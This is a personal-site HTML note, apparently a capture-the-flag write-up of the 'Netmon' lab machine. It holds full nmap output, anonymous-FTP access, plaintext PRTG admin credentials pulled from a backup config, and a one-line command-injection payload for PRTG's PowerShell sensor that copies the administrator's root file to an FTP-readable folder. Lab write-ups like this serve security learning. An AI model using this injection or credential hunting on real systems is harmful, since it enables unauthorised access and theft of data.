@@ -1,0 +1,127 @@
+<!--*INDEXED*-->
+<html>
+<head>
+    <!-- meta things -->
+    <meta name=viewport content="width=device-width, initial-scale=1">
+    <title>Note - Nathan Higley</title>
+    <link rel="canonical" href="https://nathanhigley.com" />
+    <!-- end meta things -->
+  
+    <!-- favicon code -->
+    <link rel="apple-touch-icon" sizes="180x180" href="../../images/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="../../images/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="../../images/favicon-16x16.png">
+    <link rel="manifest" href="../../images/site.webmanifest">
+    <link rel="shortcut icon" href="../../images/favicon.ico">
+    <meta name="msapplication-TileColor" content="#2b5797">
+    <meta name="msapplication-config" content="../../images/browserconfig.xml">
+    <meta name="theme-color" content="#ffffff">
+    <!-- end favicon code -->
+  
+    <!-- style sheets -->
+    <link rel="stylesheet" href="../../style-sheets/styles.css">
+    <link rel="stylesheet" href="../../style-sheets/bootstrap-grid.css">
+    <link rel="stylesheet" href="../../style-sheets/bootstrap-grid.min.css">
+    <link rel="stylesheet" href="../../style-sheets/bootstrap-reboot.css">
+    <link rel="stylesheet" href="../../style-sheets/bootstrap-reboot.min.css">
+    <link rel="stylesheet" href="../../style-sheets/fontawesome.css">
+    <link rel="stylesheet" href="../../style-sheets/fonts.css">
+    <!-- end style sheets -->
+    <link rel="stylesheet" href="css/boostnote.css">
+    <link rel="stylesheet" href="css/dracula.css">
+    <link rel="stylesheet" href="css/katex.min.css">
+    <link rel="stylesheet" href="css/codemirror.css">
+    <link rel="stylesheet" href="css/main.min.css">
+</head>
+<body class="note-body">
+
+    <!-- nav code -->
+    <nav>
+        <ul class="note-header"> 
+            <li class="nav"><a class="nav" href="../../index.html#home"><i class="fas fa-igloo"></i><span class="labels"> Home</span></a></li>
+            <li class="nav"><a class="nav" href="../../index.html#about"><i class="fas fa-info-circle"></i><span class="labels"> About</span></a></li>
+            <li class="nav"><a class="nav" href="../../index.html#work"><i class="fas fa-desktop"></i><span class="labels"> Work</span></a></li>
+            <li class="nav"><a class="nav" href="../../index.html#contact"><i class="fas fa-address-card"></i><span class="labels"> Contact</span></a></li>
+            <li class="nav"><a class="nav" href="../notes.html"><i class="fas fa-sticky-note"></i><span class="labels"> Notes</span></a></li>
+        </ul>
+    </nav>
+    <!-- end nav code -->
+    <div class="d-flex" >
+      <div class="container-fluid">
+        <div class="row">
+          <div class="col-lg-12 note-spacer"></div>
+          <div class="col-lg-12"><h1 id="Netmon" data-line="0">Netmon</h1><h3 id="Enumeration" data-line="2">Enumeration</h3>
+<blockquote data-line="4">
+<p data-line="4">–&gt; nmap -A -p- -T4:</p>
+</blockquote>
+<pre class="code CodeMirror cm-s-dracula" data-line="5">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span><span class="CodeMirror-linenumber">2</span><span class="CodeMirror-linenumber">3</span><span class="CodeMirror-linenumber">4</span><span class="CodeMirror-linenumber">5</span><span class="CodeMirror-linenumber">6</span><span class="CodeMirror-linenumber">7</span><span class="CodeMirror-linenumber">8</span><span class="CodeMirror-linenumber">9</span><span class="CodeMirror-linenumber">10</span><span class="CodeMirror-linenumber">11</span><span class="CodeMirror-linenumber">12</span><span class="CodeMirror-linenumber">13</span><span class="CodeMirror-linenumber">14</span><span class="CodeMirror-linenumber">15</span><span class="CodeMirror-linenumber">16</span><span class="CodeMirror-linenumber">17</span><span class="CodeMirror-linenumber">18</span><span class="CodeMirror-linenumber">19</span><span class="CodeMirror-linenumber">20</span><span class="CodeMirror-linenumber">21</span><span class="CodeMirror-linenumber">22</span><span class="CodeMirror-linenumber">23</span><span class="CodeMirror-linenumber">24</span><span class="CodeMirror-linenumber">25</span><span class="CodeMirror-linenumber">26</span><span class="CodeMirror-linenumber">27</span><span class="CodeMirror-linenumber">28</span><span class="CodeMirror-linenumber">29</span><span class="CodeMirror-linenumber">30</span><span class="CodeMirror-linenumber">31</span><span class="CodeMirror-linenumber">32</span><span class="CodeMirror-linenumber">33</span><span class="CodeMirror-linenumber">34</span><span class="CodeMirror-linenumber">35</span><span class="CodeMirror-linenumber">36</span><span class="CodeMirror-linenumber">37</span><span class="CodeMirror-linenumber">38</span><span class="CodeMirror-linenumber">39</span><span class="CodeMirror-linenumber">40</span><span class="CodeMirror-linenumber">41</span></span>
+        <code class="">Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-08 20:55 EST
+Nmap scan report for 10.10.10.152
+Host is up (0.100s latency).
+Not shown: 996 closed ports
+PORT    STATE SERVICE      VERSION
+21/tcp  open  ftp          Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 02-02-19  11:18PM                 1024 .rnd
+| 02-25-19  09:15PM       &lt;DIR&gt;          inetpub
+| 07-16-16  08:18AM       &lt;DIR&gt;          PerfLogs
+| 02-25-19  09:56PM       &lt;DIR&gt;          Program Files
+| 02-02-19  11:28PM       &lt;DIR&gt;          Program Files (x86)
+| 02-03-19  07:08AM       &lt;DIR&gt;          Users
+|_02-25-19  10:49PM       &lt;DIR&gt;          Windows
+| ftp-syst: 
+|_  SYST: Windows_NT
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+
+
+Network Distance: 2 hops
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -2s, deviation: 0s, median: -2s
+| smb-security-mode: 
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2019-03-08 20:56:22
+|_  start_date: 2019-03-08 20:11:33
+
+TRACEROUTE (using port 5900/tcp)
+HOP RTT       ADDRESS
+1   100.19 ms 10.10.12.1
+2   100.41 ms 10.10.10.152
+</code>
+      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><h2 id="Got-User" data-line="49">Got User</h2>
+<blockquote data-line="50">
+<p data-line="50">Just log in to anonymous FTP and find the user.txt file.</p>
+</blockquote>
+<h2 id="Got-Admin-Credentials-For-Web-App" data-line="52">Got Admin Credentials For Web App</h2>
+<blockquote data-line="53">
+<p data-line="53">Find plaintext credentials in 'C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.old.bak’<br>
+username = prtgadmin<br>
+password = PrTg@dmin2019</p>
+</blockquote>
+<h2 id="Got-Admin-Hash" data-line="57">Got Admin Hash</h2>
+<blockquote data-line="59">
+<p data-line="59">Exploit a vulnerability in the PRGT Netmon’s powershell sensor, more specifically the default powershell script.  This allows for execution of a powershell script as administrator.   Use the powerline command to copy the root.txt file to a hidden folder that is open to the FTP, and grab the file using FTP.</p>
+</blockquote>
+<pre class="code CodeMirror cm-s-dracula" data-line="60">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span></span>
+        <code class="">Test.txt;Copy-Item -Path C:\Users\Administrator\root.txt -Destination C:\ProgramData\1.txt -Force 
+</code>
+<i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre></div></div></div></div>
+<!--footer code-->
+<footer>
+    <a class=footer-link target="_blank" rel="noopener noreferrer" href="https://github.com/nadehi18"><i class="fab fa-github"></i></a>
+    <a class=footer-link target="_blank" rel="noopener noreferrer" href="https://linkedin.com/in/nadehi18"><i class="fab fa-linkedin"></i></a>
+    <a class=footer-link target="_blank" rel="noopener noreferrer" href="https://twitter.com/nadehi18"><i class="fab fa-twitter"></i></a>
+</footer>
+<!-- end footer code-->
+</body>            </html>
